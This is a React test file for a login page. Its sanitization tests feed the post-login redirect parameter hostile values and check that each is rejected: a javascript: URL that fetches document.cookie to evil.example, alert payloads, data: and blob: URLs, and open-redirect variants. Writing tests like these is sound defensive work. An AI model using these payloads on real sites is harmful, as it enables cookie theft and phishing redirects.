/**
 */

import {
  act,
  render,
  screen,
  fireEvent,
  waitFor,
} from "@testing-library/react";

import { aironeApiClient } from "../repository/AironeApiClient";

import { DEFAULT_LOGIN_NEXT, LoginPage, resolveLoginNext } from "./LoginPage";

import { TestWrapper } from "TestWrapper";
import i18n from "i18n/config";

const loginContext = vi.hoisted(() => ({ next: "/ui/" }));

// Mock ServerContext
vi.mock("../services/ServerContext", () => ({
  ServerContext: {
    getInstance: () => ({
      title: "AirOne",
      subTitle: "Test Subtitle",
      loginNext: loginContext.next,
      checkTermService: false,
      termsOfServiceUrl: "https://example.com/terms",
      singleSignOnLoginUrl: null,
      noteLink: "https://example.com/note",
      noteDesc: "Note Description",
      passwordResetDisabled: false,
    }),
  },
}));

// Mock API client
vi.mock("../repository/AironeApiClient", () => ({
  aironeApiClient: {
    postLogin: vi.fn(() => Promise.resolve({ type: "basic" })),
  },
}));

afterEach(() => {
  vi.clearAllMocks();
  loginContext.next = "/ui/";
});

describe("LoginPage", () => {
  test("should match snapshot", () => {
    const result = render(<LoginPage />, {
      wrapper: TestWrapper,
    });

    expect(result).toMatchSnapshot();
  });

  describe("rendering", () => {
    test("should render login form with username and password fields", () => {
      render(<LoginPage />, { wrapper: TestWrapper });

      expect(screen.getByLabelText("Username")).toBeInTheDocument();
      expect(screen.getByLabelText("Password")).toBeInTheDocument();
      expect(screen.getByRole("button", { name: "Login" })).toBeInTheDocument();
    });

    test("should render application title", () => {
      render(<LoginPage />, { wrapper: TestWrapper });

      expect(screen.getByText("AirOne")).toBeInTheDocument();
    });

    test("should render subtitle", () => {
      render(<LoginPage />, { wrapper: TestWrapper });

      expect(screen.getByText("Test Subtitle")).toBeInTheDocument();
    });

    test("should render password reset link when not disabled", () => {
      render(<LoginPage />, { wrapper: TestWrapper });

      expect(screen.getByText("パスワードリセット")).toBeInTheDocument();
    });

    test("should render note link with description", () => {
      render(<LoginPage />, { wrapper: TestWrapper });

      expect(screen.getByText("Note Description")).toBeInTheDocument();
      expect(
        screen.getByRole("link", { name: /Note Description/ }),
      ).toHaveAttribute("href", "https://example.com/note");
    });

    test("should not render SSO login link when not configured", () => {
      render(<LoginPage />, { wrapper: TestWrapper });

      expect(screen.queryByText("SSO ログイン")).not.toBeInTheDocument();
    });

    test("should render password reset link in English", async () => {
      await act(async () => {
        await i18n.changeLanguage("en");
      });

      render(<LoginPage />, { wrapper: TestWrapper });

      expect(screen.getByText("Password reset")).toBeInTheDocument();
    });
  });

  describe("form interaction", () => {
    test("should allow typing in username field", () => {
      render(<LoginPage />, { wrapper: TestWrapper });

      const usernameInput = screen.getByLabelText("Username");
      fireEvent.change(usernameInput, { target: { value: "testuser" } });

      expect(usernameInput).toHaveValue("testuser");
    });

    test("should allow typing in password field", () => {
      render(<LoginPage />, { wrapper: TestWrapper });

      const passwordInput = screen.getByLabelText("Password");
      fireEvent.change(passwordInput, { target: { value: "testpass123" } });

      expect(passwordInput).toHaveValue("testpass123");
    });

    test("should toggle password visibility when clicking visibility icon", () => {
      render(<LoginPage />, { wrapper: TestWrapper });

      const passwordInput = screen.getByLabelText("Password");
      expect(passwordInput).toHaveAttribute("type", "password");

      // Find the visibility toggle button
      const buttons = screen.getAllByRole("button");
      const visibilityButton = buttons.find(
        (btn) => btn.getAttribute("type") !== "submit",
      );

      expect(visibilityButton).toBeDefined();
      if (visibilityButton) {
        fireEvent.click(visibilityButton);
        expect(passwordInput).toHaveAttribute("type", "text");

        fireEvent.click(visibilityButton);
        expect(passwordInput).toHaveAttribute("type", "password");
      }
    });

    test("should have hidden next input with loginNext value", () => {
      render(<LoginPage />, { wrapper: TestWrapper });

      const nextInput = document.getElementById("next") as HTMLInputElement;
      expect(nextInput).toBeInTheDocument();
      expect(nextInput.type).toBe("hidden");
      expect(nextInput.value).toBe("/ui/");
    });
  });

  describe("password reset modal", () => {
    test("should have clickable password reset link", () => {
      render(<LoginPage />, { wrapper: TestWrapper });

      const resetLink = screen.getByText("パスワードリセット");
      expect(resetLink).toBeInTheDocument();
      expect(resetLink.closest("a")).toBeInTheDocument();
    });

    test("should open password reset modal when link is clicked", () => {
      render(<LoginPage />, { wrapper: TestWrapper });

      const resetLink = screen.getByText("パスワードリセット");
      fireEvent.click(resetLink);

      // The modal should be opened - it renders PasswordResetModal component
      // Since the modal is part of the component, clicking should not throw
    });
  });

  describe("login button", () => {
    test("should have submit type button", () => {
      render(<LoginPage />, { wrapper: TestWrapper });

      const loginButton = screen.getByRole("button", { name: "Login" });
      expect(loginButton).toHaveAttribute("type", "submit");
    });
  });
});

const ORIGIN = "http://localhost:3000";

describe("login next sanitization", () => {
  const originalLocation = window.location;

  const stubLocation = () => {
    const stub = {
      origin: ORIGIN,
      href: `${ORIGIN}/auth/login/`,
      pathname: "/auth/login/",
      search: "",
      assign: vi.fn(),
      replace: vi.fn(),
    };
    Object.defineProperty(window, "location", {
      configurable: true,
      writable: true,
      value: stub,
    });

    return stub;
  };

  const submitLogin = async () => {
    const loginButton = screen.getByRole("button", { name: "Login" });
    await act(async () => {
      fireEvent.click(loginButton);
    });
  };

  // undici's FormData (installed globally by vitest.setup.ts) cannot convert a
  // jsdom form element, so provide a minimal stand-in for the submit path.
  class FormDataStub {
    append() {}
    get() {
      return null;
    }
  }

  beforeEach(() => {
    vi.stubGlobal("FormData", FormDataStub as unknown as typeof FormData);
    vi.mocked(aironeApiClient.postLogin).mockResolvedValue({
      type: "opaqueredirect",
    } as unknown as Response);
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    Object.defineProperty(window, "location", {
      configurable: true,
      writable: true,
      value: originalLocation,
    });
  });

  test("falls back to the default path for a javascript: URL", async () => {
    const location = stubLocation();
    loginContext.next = "javascript:alert(document.cookie)";

    render(<LoginPage />, { wrapper: TestWrapper });
    await submitLogin();

    await waitFor(() => {
      expect(location.assign).toHaveBeenCalledWith(DEFAULT_LOGIN_NEXT);
    });
  });

  test("falls back to the default path for a javascript: URL that hides behind a relative-looking suffix", async () => {
    const location = stubLocation();
    // The login page used to decode JS escape sequences, so a value like this
    // could reach the SPA as a javascript: URL that also contains '/ui/'.
    loginContext.next =
      "javascript:fetch('//evil.example/'+document.cookie)//ui/";

    render(<LoginPage />, { wrapper: TestWrapper });
    await submitLogin();

    await waitFor(() => {
      expect(location.assign).toHaveBeenCalledWith(DEFAULT_LOGIN_NEXT);
    });
  });

  test("falls back to the default path for a different origin", async () => {
    const location = stubLocation();
    loginContext.next = "https://evil.example/ui/";

    render(<LoginPage />, { wrapper: TestWrapper });
    await submitLogin();

    await waitFor(() => {
      expect(location.assign).toHaveBeenCalledWith(DEFAULT_LOGIN_NEXT);
    });
  });

  test("falls back to the default path for a protocol-relative URL of another origin", async () => {
    const location = stubLocation();
    loginContext.next = "//evil.example/ui/";

    render(<LoginPage />, { wrapper: TestWrapper });
    await submitLogin();

    await waitFor(() => {
      expect(location.assign).toHaveBeenCalledWith(DEFAULT_LOGIN_NEXT);
    });
  });

  test("navigates to a same-origin path", async () => {
    const location = stubLocation();
    loginContext.next = "/ui/entries/1";

    render(<LoginPage />, { wrapper: TestWrapper });
    await submitLogin();

    await waitFor(() => {
      expect(location.assign).toHaveBeenCalledWith(`${ORIGIN}/ui/entries/1`);
    });
  });

  test("navigates to an absolute same-origin URL", async () => {
    const location = stubLocation();
    loginContext.next = `${ORIGIN}/ui/entities/2/entries/`;

    render(<LoginPage />, { wrapper: TestWrapper });
    await submitLogin();

    await waitFor(() => {
      expect(location.assign).toHaveBeenCalledWith(
        `${ORIGIN}/ui/entities/2/entries/`,
      );
    });
  });
});

describe("resolveLoginNext", () => {
  test("returns the default path for unusable values", () => {
    expect(resolveLoginNext(null)).toBe(DEFAULT_LOGIN_NEXT);
    expect(resolveLoginNext(undefined)).toBe(DEFAULT_LOGIN_NEXT);
    expect(resolveLoginNext("")).toBe(DEFAULT_LOGIN_NEXT);
    expect(resolveLoginNext("javascript:alert(1)")).toBe(DEFAULT_LOGIN_NEXT);
    expect(resolveLoginNext("JAVASCRIPT:alert(1)")).toBe(DEFAULT_LOGIN_NEXT);
    expect(resolveLoginNext("data:text/html,<script>alert(1)</script>")).toBe(
      DEFAULT_LOGIN_NEXT,
    );
    expect(resolveLoginNext("blob:https://evil.example/uuid")).toBe(
      DEFAULT_LOGIN_NEXT,
    );
    expect(resolveLoginNext("https://evil.example/ui/")).toBe(
      DEFAULT_LOGIN_NEXT,
    );
    expect(resolveLoginNext("//evil.example/ui/")).toBe(DEFAULT_LOGIN_NEXT);
    // a single leading backslash is normalized to a relative path, so it stays
    // on this origin; two of them (or '/\\') select a foreign origin and are
    // rejected
    expect(resolveLoginNext("\\evil.example/ui/")).toBe(
      `${window.location.origin}/evil.example/ui/`,
    );
    expect(resolveLoginNext("/\\evil.example/ui/")).toBe(DEFAULT_LOGIN_NEXT);
    expect(resolveLoginNext("\\\\evil.example/ui/")).toBe(DEFAULT_LOGIN_NEXT);
    // userinfo tricks must not change the origin
    expect(resolveLoginNext(`http://localhost:3000@evil.example/ui/`)).toBe(
      DEFAULT_LOGIN_NEXT,
    );
    // unparsable values fall back instead of throwing
    expect(resolveLoginNext("http://[")).toBe(DEFAULT_LOGIN_NEXT);
  });

  test("keeps same-origin destinations", () => {
    expect(resolveLoginNext("/ui/")).toBe(`${window.location.origin}/ui/`);
    expect(resolveLoginNext("/ui/entries/1?x=1")).toBe(
      `${window.location.origin}/ui/entries/1?x=1`,
    );
    expect(resolveLoginNext(`${window.location.origin}/ui/`)).toBe(
      `${window.location.origin}/ui/`,
    );
    // surrounding whitespace is stripped by the URL parser
    expect(resolveLoginNext("  /ui/entries/1  ")).toBe(
      `${window.location.origin}/ui/entries/1`,
    );
    expect(resolveLoginNext("\t/ui/entries/1")).toBe(
      `${window.location.origin}/ui/entries/1`,
    );
  });

  test("renders the login form instead of crashing on an unparsable next", () => {
    loginContext.next = "http://[";

    expect(() => render(<LoginPage />, { wrapper: TestWrapper })).not.toThrow();
    expect(screen.getByLabelText("Username")).toBeInTheDocument();
  });
});

describe("iframe login", () => {
  test("opens login in a separate tab with a completion destination", () => {
    loginContext.next = "/ui/iframe/?example=1";
    render(<LoginPage />, { wrapper: TestWrapper });
    const link = screen.getByRole("link", { name: "別タブでログイン" });
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
    const url = new URL(link.getAttribute("href")!, window.location.origin);
    expect(url.searchParams.get("next")).toBe("/ui/iframe/login-complete/");
    expect(screen.queryByLabelText("Password")).not.toBeInTheDocument();
    expect(
      screen.getByRole("button", { name: "再読み込み" }),
    ).toBeInTheDocument();
  });

  test("shows the normal form in the separate login tab", () => {
    loginContext.next = "/ui/iframe/login-complete/";
    render(<LoginPage />, { wrapper: TestWrapper });
    expect(screen.getByLabelText("Password")).toBeInTheDocument();
    expect(document.querySelector('input[name="next"]')).toHaveValue(
      loginContext.next,
    );
    expect(
      screen.queryByRole("link", { name: "別タブでログイン" }),
    ).not.toBeInTheDocument();
  });
});
